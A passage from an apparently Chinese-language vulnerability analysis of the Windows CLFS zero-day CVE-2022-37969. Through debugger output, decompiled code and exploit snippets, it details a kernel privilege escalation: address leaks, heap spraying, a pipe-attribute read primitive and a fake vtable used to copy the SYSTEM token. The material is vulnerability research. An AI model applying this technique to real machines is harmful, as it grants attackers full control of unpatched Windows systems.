93e0d330 ffffa78f ffffa78f`9469d4f8 00000001 00000002 00000000 00000000 ffffa78f`9469d508 003f005c 005c003f 003a0043 0055005c ffffa78f`9469d518 00650073 00730072 0050005c 00620075 ffffa78f`9469d528 0069006c 005c0063 0063002e 006e006f ffffa78f`9469d538 00610074 006e0069 00720065 0031005f ffffa78f`9469d548 00340031 00360037 00000039 00000000 根据伪代码可知memset的位置为BaseLogRecord + 0x 1338 + cbSymbolZone\n如果要利用前一个日志文件在AllocSymbol时修改后一个日志文件的container context→pContainer的高四位则应满足下列条件\nffffa78f9469d4f4 = BaseLogRecord + 0x1338 + cbSymbolZone`，计算可得\n0: kd\u0026gt; ?ffffa78f`9469d4f4 - 0x1338 - rax Evaluate expression: 69964 = 00000000`0001114c 通过memset将指针高四位清零后，通过NtSetInformationFile函数为container文件设置属性13（关闭时删除文件）。在关闭日志文件句柄时会调用CClfsBaseFilePersisted::RemoveContainer函数移除container，在该函数中会获取container context并解引用container context→pContainer，由于指针损坏，导致蓝屏。\n在CLFS!CClfsBaseFilePersisted::RemoveContainer 断点\nbp CLFS!CClfsBaseFilePersisted::RemoveContainer 1: kd\u0026gt; db r15 ffffd70e`48d9d4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffffd70e`48d9d4e8 00 00 00 00 00 00 00 00-e0 37 c1 00 00 00 00 00 .........7...... ffffd70e`48d9d4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffd70e`48d9d548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff88e`db5aa5e0 fffff806`0b6f120b CLFS!CClfsBaseFilePersisted::RemoveContainer+0x10f 01 fffff88e`db5aa640 fffff806`0b6f8b0f CLFS!CClfsLogFcbPhysical::DeleteBaseFileAndContainers+0xf3 02 fffff88e`db5aa690 fffff806`0b6f8761 CLFS!CClfsLogFcbPhysical::Finalize+0x39b 03 fffff88e`db5aa6c0 fffff806`0b71df42 CLFS!CClfsLogFcbPhysical::Release+0xb1 04 fffff88e`db5aa720 fffff806`0b720878 CLFS!CClfsRequest::Close+0xd6 05 fffff88e`db5aa770 fffff806`0b720747 CLFS!ClfsDispatchIoRequest+0x108 06 fffff88e`db5aa7c0 fffff806`0d8abac5 CLFS!CClfsDriver::LogIoDispatch+0x27 07 fffff88e`db5aa7f0 fffff806`0dbf088f nt!IofCallDriver+0x55 08 fffff88e`db5aa830 fffff806`0dc19af0 nt!IopDeleteFile+0x14f 09 fffff88e`db5aa8b0 fffff806`0d8ae1a7 nt!ObpRemoveObjectRoutine+0x80 0a fffff88e`db5aa910 fffff806`0dc22449 nt!ObfDereferenceObjectWithTag+0xc7 0b fffff88e`db5aa950 fffff806`0dc2627c nt!ObCloseHandleTableEntry+0x6c9 0c fffff88e`db5aaa90 fffff806`0da0a2b5 nt!NtClose+0xec 0d fffff88e`db5aab00 00007ff8`0b48d124 nt!KiSystemServiceCopyEnd+0x25 0e 0000001d`518fe678 00007ff8`08bea405 ntdll!NtClose+0x14 0f 0000001d`518fe680 00000000`00000000 0x00007ff8`08bea405 1: kd\u0026gt; u CLFS!CClfsBaseFilePersisted::RemoveContainer+0x10f: fffff806`0b716ebf 498b7f18 mov rdi,qword ptr [r15+18h] fffff806`0b716ec3 4885ff test rdi,rdi fffff806`0b716ec6 0f84b9000000 je CLFS!CClfsBaseFilePersisted::RemoveContainer+0x1d5 (fffff806`0b716f85) fffff806`0b716ecc 4983671800 and qword ptr [r15+18h],0 fffff806`0b716ed1 65488b142588010000 mov rdx,qword ptr gs:[188h] fffff806`0b716eda 488b4e20 mov rcx,qword ptr [rsi+20h] fffff806`0b716ede 4c8b15c3d1ffff mov r10,qword ptr [CLFS!_imp_ExReleaseResourceForThreadLite (fffff806`0b7140a8)] fffff806`0b716ee5 e8a6552102 call nt!ExReleaseResourceForThreadLite (fffff806`0d92c490) __int64 __fastcall CClfsBaseFilePersisted::RemoveContainer(CClfsBaseFilePersisted *this, unsigned int a2) { __int64 v2; // r12 BOOLEAN v4; // r14 __int64 BaseLogRecord; // rax __int64 v6; // rdi int v7; // r14d int Symbol; // eax int v9; // ebx struct _CLFS_CONTAINER_CONTEXT *v10; // r15 int v11; // eax __int64 v12; // rdi __int64 v13; // rax BOOLEAN v15; // [rsp+20h] [rbp-38h] unsigned int v16; // [rsp+24h] [rbp-34h] struct _CLFS_CONTAINER_CONTEXT *v17; // [rsp+70h] [rbp+18h] BYREF v2 = a2; v17 = 0i64; v4 = ExAcquireResourceExclusiveLite(*((PERESOURCE *)this + 4), 1u); v15 = v4; BaseLogRecord = CClfsBaseFile::GetBaseLogRecord(this); v6 = BaseLogRecord; if ( !BaseLogRecord ) { v9 = -1072037875; v16 = -1072037875; goto LABEL_20; } v7 = *(_DWORD *)(BaseLogRecord + 4 * v2 + 808); if ( !v7 ) { v9 = -1073741816; LABEL_14: v16 = v9; goto LABEL_19; } Symbol = CClfsBaseFile::GetSymbol(this, v7, v2, \u0026amp;v17); v9 = Symbol; v16 = Symbol; v10 = v17; if ( v17 ) { if ( Symbol \u0026gt;= 0 ) { v9 = CClfsBaseFilePersisted::RemoveSymbol(this, v7); v16 = v9; if ( v9 \u0026gt;= 0 ) { LODWORD(v17) = *(_DWORD *)(v6 + 4 * v2 + 808); *(_DWORD *)(v6 + 4 * v2 + 808) = 0; RtlClearBits((PRTL_BITMAP)((char *)this + 232), v2, 1u); RtlNumberOfSetBits((PRTL_BITMAP)((char *)this + 232)); if ( *((_DWORD *)v10 + 9) != 1 ) --*(_DWORD *)(v6 + 300); v11 = CClfsBaseFilePersisted::FlushImage(this); v9 = v11; v16 = v11; if ( v11 \u0026gt;= 0 ) { v12 = *((_QWORD *)v10 + 3); if ( v12 ) { *((_QWORD *)v10 + 3) = 0i64; ExReleaseResourceForThreadLite(*((PERESOURCE *)this + 4), (ERESOURCE_THREAD)KeGetCurrentThread()); v4 = 0; (*(void (__fastcall **)(__int64))(*(_QWORD *)v12 + 24i64))(v12); (*(void (__fastcall **)(__int64))(*(_QWORD *)v12 + 8i64))(v12); v9 = v16; goto LABEL_20; } goto LABEL_19; } if ( v11 != -1073741816 ) { v13 = CClfsBaseFile::OffsetToAddr(this); if ( v13 ) { *(_BYTE *)(v13 - 8) = 0; *(_DWORD *)(v6 + 4 * v2 + 808) = (_DWORD)v17; RtlSetBits((PRTL_BITMAP)((char *)this + 232), v2, 1u); if ( *((_DWORD *)v10 + 9) != 1 ) ++*(_DWORD *)(v6 + 300); goto LABEL_19; } v9 = -1072037875; goto LABEL_14; } } } } LABEL_19: v4 = v15; LABEL_20: if ( v4 ) { ExReleaseResourceForThreadLite(*((PERESOURCE *)this + 4), (ERESOURCE_THREAD)KeGetCurrentThread()); return v16; } return (unsigned int)v9; } 最后附上zscaler画的流程图\nhttps://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part\nEXP分析 首先通过查询SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\CurrentBuild 来确定系统版本是否在范围内，因为在_EPROCESS中_TOKEN偏移是不固定的，此次所使用的偏移为0x4B8.\nif (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(\u0026#34;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\u0026#34;), NULL, KEY_READ, \u0026amp;hKey) == ERROR_SUCCESS) { printf(\u0026#34;[+] Registry key Opened successfully\\n\u0026#34;); } ...... RegQueryValueEx(hKey, TEXT(\u0026#34;CurrentBuild\u0026#34;), NULL, \u0026amp;cType, (LPBYTE)lpData, \u0026amp;buffersize); //\t-1表示处理整个缓冲区 WideCharToMultiByte(CP_UTF8, 0, lpData, -1, (LPSTR)buf, 0x80, 0, 0); winversion = atoi(buf); wprintf(L\u0026#34;[+] Windows Build Number: %i\\n\u0026#34;, winversion); if (winversion \u0026gt;= 17763 \u0026amp;\u0026amp; winversion \u0026lt;= 22000) { token_offset = 0x4b8; // store the token offset } else { printf(\u0026#34;[!] Version %d not supported. Exiting...\\n\u0026#34;, winversion); exit(-1); } EXP通过调用NtQuerySystemInformation 函数，并将SystemInformationClass 参数设置为SystemExtendedHandleInformation 查询系统句柄信息（进程），遍历handle 列表，通过比较UniqueProcessId来确定找到的进程PID并返回其_EPROCESS地址，EXP中分别获取到自身的_EPROCESS地址和pid为4的进程的_EPROCESS地址。\nstatus = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, handleInfo, handleInfoSize, \u0026amp;retLength); for (ULONG i = 0; i \u0026lt; handleInfo-\u0026gt;NumberOfHandles; i++) { if ((USHORT)Object == 0x4) { if (0x4 == (DWORD)handleInfo-\u0026gt;Handles[i].UniqueProcessId \u0026amp;\u0026amp; (SIZE_T)Object == (SIZE_T)handleInfo-\u0026gt;Handles[i].HandleValue) { kernelAddress = (SIZE_T)handleInfo-\u0026gt;Handles[i].Object; bFind = TRUE; break; } } else { if (GetCurrentProcessId() == (DWORD)handleInfo-\u0026gt;Handles[i].UniqueProcessId \u0026amp;\u0026amp; (SIZE_T)Object == (SIZE_T)handleInfo-\u0026gt;Handles[i].HandleValue) { kernelAddress = (SIZE_T)handleInfo-\u0026gt;Handles[i].Object; bFind = TRUE; break; } } } EXP进行堆喷射，循环在偏移0x10000开始每隔0x10位置写入0x500000。\n绕过CreatePipe创建管道并通过NtFsControlFile设置管道属性，其中FsControlCode 参数被设为0x11003c，这使得在之后可以通过调用NtFsControlFile并传递FsControlCode 参数为0x110038来读取管道属性。\nEXP通过调用NtQuerySystemInformation并传递SystemInformationClass参数为SystemBigPoolInformation查询内核堆信息。通过循环遍历堆信息并比较堆tag找到了Pipe堆在内核的地址。\n0: kd\u0026gt; db ffffa48d64eff000 ffffa48d`64eff000 50 25 a6 67 8d a4 ff ff-50 25 a6 67 8d a4 ff ff P%.g....P%.g.... ffffa48d`64eff010 28 f0 ef 64 8d a4 ff ff-d6 0f 00 00 00 00 00 00 (..d............ ffffa48d`64eff020 2a f0 ef 64 8d a4 ff ff-5a 00 00 00 00 00 00 00 *..d....Z....... ffffa48d`64eff030 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff040 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff050 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff060 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffa48d`64eff070 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA 将系统EPROCESS进行异或后存到栈上的地址中\n将41414141写到0x100000007的内存地址上\n获取到SeSetAccessStateGenericMapping函数地址\n1: kd\u0026gt; u fffff8046b3f2da0 nt!SeSetAccessStateGenericMapping: fffff804`6b3f2da0 488b4148 mov rax,qword ptr [rcx+48h] fffff804`6b3f2da4 0f1002 movups xmm0,xmmword ptr [rdx] fffff804`6b3f2da7 f30f7f4008 movdqu xmmword ptr [rax+8],xmm0 fffff804`6b3f2dac c3 ret fffff804`6b3f2dad cc int 3 fffff804`6b3f2dae cc int 3 fffff804`6b3f2daf cc int 3 fffff804`6b3f2db0 cc int 3 获取ClfsEarlierLsn的内核地址\n0: kd\u0026gt; u FFFFF8046A9F1CB0 CLFS!ClfsEarlierLsn: fffff804`6a9f1cb0 488b05c1240000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff804`6a9f4178)] fffff804`6a9f1cb7 4885c9 test rcx,rcx fffff804`6a9f1cba 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff804`6a9f1cf2) fffff804`6a9f1cbc 488b09 mov rcx,qword ptr [rcx] fffff804`6a9f1cbf 483b0d82210000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff804`6a9f3e48)] fffff804`6a9f1cc6 742a je CLFS!ClfsEarlierLsn+0x42 (fffff804`6a9f1cf2) fffff804`6a9f1cc8 483bc8 cmp rcx,rax fffff804`6a9f1ccb 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff804`6a9f1cf2) 把两个函数布局到0x500008和0x500018上\n触发漏洞pContainer指针高5位被清零，指针指向0x593a0，该地址为用户层内存地址。\n1: kd\u0026gt; db rax ffffbc0b`276dd070 06 00 00 00 00 00 00 00-69 be 23 a9 92 15 ee 11 ........i.#..... ffffbc0b`276dd080 bc 80 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 ....)..2........ ffffbc0b`276dd090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0a0 00 00 00 00 00 00 00 00-38 13 00 00 00 00 00 00 ........8....... ffffbc0b`276dd0b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0c0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0d0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276dd0e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; db rax -0x11000 ffffbc0b`276cc070 01 00 00 00 00 00 00 00-2b 21 72 e4 7f 15 ee 11 ........+!r..... ffffbc0b`276cc080 bc 7f 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 ....)..2........ ffffbc0b`276cc090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0a0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0c0 00 00 00 00 00 00 00 00-38 13 00 00 00 00 00 00 ........8....... ffffbc0b`276cc0d0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276cc0e0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; db rax + 0x1468 ffffbc0b`276de4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffffbc0b`276de4e8 00 00 00 00 00 00 00 00-a0 93 50 00 00 00 00 00 ..........P..... ffffbc0b`276de4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 获取pContainer指针，并尝试解引用pContainer获取到CClfsContainer对象，而后调用对象的指针\nfffff800`11306ebf 498b7f18 mov rdi, qword ptr [r15+18h] fffff800`11306ec3 4885ff test rdi, rdi fffff800`11306ec6 0f84b9000000 je CLFS!CClfsBaseFilePersisted::RemoveContainer+0x1d5 (fffff80011306f85) fffff800`11306ecc 4983671800 and qword ptr [r15+18h], 0 fffff800`11306ed1 65488b142588010000 mov rdx, qword ptr gs:[188h] fffff800`11306eda 488b4e20 mov rcx, qword ptr [rsi+20h] fffff800`11306ede 4c8b15c3d1ffff mov r10, qword ptr [CLFS!__imp_ExReleaseResourceForThreadLite (fffff800113040a8)] fffff800`11306ee5 e8a655c203 call ntkrnlmp!ExReleaseResourceForThreadLite (fffff80014f2c490) fffff800`11306eea 4532f6 xor r14b, r14b fffff800`11306eed 4488742420 mov byte ptr [rsp+20h], r14b fffff800`11306ef2 488b07 mov rax, qword ptr [rdi] fffff800`11306ef5 488b4018 mov rax, qword ptr [rax+18h] fffff800`11306ef9 488bcf mov rcx, rdi fffff800`11306efc ff15ced6ffff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800113045d0)] fffff800`11306f02 488b07 mov rax, qword ptr [rdi] fffff800`11306f05 488b4008 mov rax, qword ptr [rax+8] fffff800`11306f09 488bcf mov rcx, rdi fffff800`11306f0c ff15bed6ffff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800113045d0)] 1: kd\u0026gt; db r15 ffffbc0b`276de4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffffbc0b`276de4e8 00 00 00 00 00 00 00 00-a0 93 50 00 00 00 00 00 ..........P..... ffffbc0b`276de4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffffbc0b`276de548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 1: kd\u0026gt; p CLFS!CClfsBaseFilePersisted::RemoveContainer+0x113: fffff800`11306ec3 4885ff test rdi,rdi 1: kd\u0026gt; rrdi rdi=00000000005093a0 1: kd\u0026gt; dp rdi 00000000`005093a0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093b0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093c0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093d0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093e0 00000000`05000000 ffffbc0b`24f9c018 00000000`005093f0 00000000`05000000 ffffbc0b`24f9c018 00000000`00509400 00000000`05000000 ffffbc0b`24f9c018 00000000`00509410 00000000`05000000 ffffbc0b`24f9c018 1: kd\u0026gt; dq 00000000`05000000 00000000`05000000 00000001`23456789 fffff800`151f2da0 00000000`05000010 00000000`00000000 fffff800`112f1cb0 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 00000000`00000000 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 该对象已经被用户层控制，CClfsContainer的vftable被指向05000000\n在05000000+0x8和05000000+0x18处的两个函数指针分别是SeSetAccessStateGenericMapping和ClfsEarlierLsn\n1: kd\u0026gt; dq 00000000`05000000 00000000`05000000 00000001`23456789 fffff800`151f2da0 00000000`05000010 00000000`00000000 fffff800`112f1cb0 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 00000000`00000000 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 1: kd\u0026gt; u fffff800`151f2da0 nt!SeSetAccessStateGenericMapping: fffff800`151f2da0 488b4148 mov rax,qword ptr [rcx+48h] fffff800`151f2da4 0f1002 movups xmm0,xmmword ptr [rdx] fffff800`151f2da7 f30f7f4008 movdqu xmmword ptr [rax+8],xmm0 fffff800`151f2dac c3 ret fffff800`151f2dad cc int 3 fffff800`151f2dae cc int 3 fffff800`151f2daf cc int 3 fffff800`151f2db0 cc int 3 1: kd\u0026gt; u fffff800`112f1cb0 CLFS!ClfsEarlierLsn: fffff800`112f1cb0 488b05c1240000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`112f4178)] fffff800`112f1cb7 4885c9 test rcx,rcx fffff800`112f1cba 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`112f1cf2) fffff800`112f1cbc 488b09 mov rcx,qword ptr [rcx] fffff800`112f1cbf 483b0d82210000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`112f3e48)] fffff800`112f1cc6 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`112f1cf2) 内核将依次调用ClfsEarlierLsn和SeSetAccessStateGenericMapping\n在ClfsEarlierLsn中edx被设为0xFFFFFFFF\nCLFS!ClfsEarlierLsn: fffff800`112f1cb0 488b05c1240000 mov rax, qword ptr [CLFS!CLFS_LSN_INVALID (fffff800112f4178)] fffff800`112f1cb7 4885c9 test rcx, rcx fffff800`112f1cba 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1cbc 488b09 mov rcx, qword ptr [rcx] fffff800`112f1cbf 483b0d82210000 cmp rcx, qword ptr [CLFS!CLFS_LSN_NULL (fffff800112f3e48)] fffff800`112f1cc6 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1cc8 483bc8 cmp rcx, rax fffff800`112f1ccb 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1ccd 83caff or edx, 0FFFFFFFFh fffff800`112f1cd0 48894c2408 mov qword ptr [rsp+8], rcx fffff800`112f1cd5 03ca add ecx, edx fffff800`112f1cd7 894c2408 mov dword ptr [rsp+8], ecx fffff800`112f1cdb 3bca cmp ecx, edx fffff800`112f1cdd 750e jne CLFS!ClfsEarlierLsn+0x3d (fffff800112f1ced) fffff800`112f1cdf 8b4c240c mov ecx, dword ptr [rsp+0Ch] fffff800`112f1ce3 85c9 test ecx, ecx fffff800`112f1ce5 740b je CLFS!ClfsEarlierLsn+0x42 (fffff800112f1cf2) fffff800`112f1ce7 03ca add ecx, edx fffff800`112f1ce9 894c240c mov dword ptr [rsp+0Ch], ecx fffff800`112f1ced 488b442408 mov rax, qword ptr [rsp+8] fffff800`112f1cf2 c3 ret 1: kd\u0026gt; redx edx=ffffffff 1: kd\u0026gt; u CLFS!ClfsEarlierLsn+0x42: fffff800`112f1cf2 c3 ret fffff800`112f1cf3 cc int 3 fffff800`112f1cf4 cc int 3 fffff800`112f1cf5 cc int 3 fffff800`112f1cf6 cc int 3 fffff800`112f1cf7 cc int 3 fffff800`112f1cf8 cc int 3 fffff800`112f1cf9 cc int 3 在SeSetAccessStateGenericMapping函数中，将rdx存储的指针复制到rcx+48存储的指针指向的内存中，前面调用ClfsEarlierLsn之后，rdx指向0xFFFFFFFF\nnt!SeSetAccessStateGenericMapping: fffff800`151f2da0 488b4148 mov rax, qword ptr [rcx+48h] fffff800`151f2da4 0f1002 movups xmm0, xmmword ptr [rdx] fffff800`151f2da7 f30f7f4008 movdqu xmmword ptr [rax+8], xmm0 fffff800`151f2dac c3 ret 在内存0xFFFFFFFF已经存储了一个指针，该指针指向了system token\n1: kd\u0026gt; dq rdx 00000000`ffffffff ffffa48f`4149e000 41414141`4141005a 00000001`0000000f 00000000`00000000 00000000`00000000 00000001`0000001f 00000000`00000000 00000000`00000000 00000001`0000002f 00000000`00000000 00000000`00000000 00000001`0000003f 00000000`00000000 00000000`00000000 00000001`0000004f 00000000`00000000 00000000`00000000 00000001`0000005f 00000000`00000000 00000000`00000000 00000001`0000006f 00000000`00000000 00000000`00000000 v14 = system_EPROCESS \u0026amp; 0xfff; v15 = system_EPROCESS \u0026amp; 0xfffffffffffff000; dest2 = 0xffffffff; dest3 = 0x100000007; value2 = 0x414141414141005A; value3 = 0; value3 = \u0026amp;value2; // 在0xffffffff地址分配0x100000大小的内存 if (VirtualAlloc((LPVOID)dest2, 0x100000, 0x3000, 4)) { memset((LPVOID)dest3, 0, 0xff8); // 写入system_EPROCESS \u0026amp; 0xfffffffffffff000; *(UINT64*)dest2 = v15; 而rcx+48存储了pipe的AttributeValueSize的地址\n1: kd\u0026gt; db rcx+0x48 00000000`005093e8 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`005093f8 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509408 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509418 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509428 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509438 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509448 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 00000000`00509458 18 c0 f9 24 0b bc ff ff-00 00 00 05 00 00 00 00 ...$............ 继续执行，将会把0xFFFFFFFF存储的指针写入到rax+8的地址上，内核中pipe对象的AttributeValue 值已经被覆盖为system token地址\n1: kd\u0026gt; nt!SeSetAccessStateGenericMapping+0xc: fffff800`151f2dac c3 ret 1: kd\u0026gt; db rax-0x18 ffffbc0b`24f9c000 b0 32 0e 27 0b bc ff ff-b0 32 0e 27 0b bc ff ff .2.\u0026#39;.....2.\u0026#39;.... ffffbc0b`24f9c010 28 c0 f9 24 0b bc ff ff-d6 0f 00 00 00 00 00 00 (..$............ ffffbc0b`24f9c020 **00 e0 49 41 8f a4 ff** ff-5a 00 41 41 41 41 41 41 ..IA....Z.AAAAAA ffffbc0b`24f9c030 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c040 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c050 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c060 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA ffffbc0b`24f9c070 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA 之后通过_NtFsControlFile并设ControlCode为0x110038，则会读取pipe对象的AttributeValue并写入到用户提供的缓冲区中，读取到这里已经读取到了system token的地址。\n为了完成token替换，exp第二次触发漏洞，在触发之前堆内存进行布局。把system token地址布局到0xFFFFFFFF，从0x10008开始每隔0x10把自身token地址写入到该地址中\n触发漏洞（这里重新调试了，所以地址不一样），在CLFS!CClfsBaseFilePersisted::RemoveContainer中断下\n1: kd\u0026gt; g Breakpoint 1 hit CLFS!CClfsBaseFilePersisted::RemoveContainer+0x48: fffff807`13a66df8 488bf8 mov rdi,rax 0: kd\u0026gt; db rax ffff8e86`0c0dd070 06 00 00 00 00 00 00 00-c6 6c 11 93 9c 15 ee 11 .........l...... ffff8e86`0c0dd080 bc 82 00 0c 29 07 fc 32-00 00 00 00 00 00 00 00 ....)..2........ ffff8e86`0c0dd090 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0a0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0b0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0c0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0dd0d0 38 13 00 00 00 00 00 00-00 00 00 00 00 00 00 00 8............... ffff8e86`0c0dd0e0 00 00 00 00 00 00 00 00-38 14 00 00 00 00 00 00 ........8....... 0: kd\u0026gt; db rax + 0x1468 ffff8e86`0c0de4d8 08 f0 fd c1 30 00 00 00-00 00 08 00 00 00 00 00 ....0........... ffff8e86`0c0de4e8 00 00 00 00 00 00 00 00-10 38 bb 00 00 00 00 00 .........8...... ffff8e86`0c0de4f8 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de508 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de518 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de528 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de538 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ ffff8e86`0c0de548 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 查看此时的pContainer对象\n0: kd\u0026gt; db bb3810 00000000`00bb3810 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3820 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3830 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3840 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3850 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3860 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3870 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... 00000000`00bb3880 00 00 00 05 00 00 00 00-30 75 fe 91 83 b1 ff ff ........0u...... vtable\n0: kd\u0026gt; dq 5000000 00000000`05000000 00000001`23456789 fffff807`15ff2da0 00000000`05000010 00000000`00000000 fffff807`13a51cb0 00000000`05000020 00000000`00000000 00000000`00000000 00000000`05000030 00000000`00000000 00000000`00000000 00000000`05000040 00000000`00000000 00000000`00000000 00000000`05000050 00000000`00000000 00000000`00000000 00000000`05000060 00000000`00000000 00000000`00000000 00000000`05000070 00000000`00000000 00000000`00000000 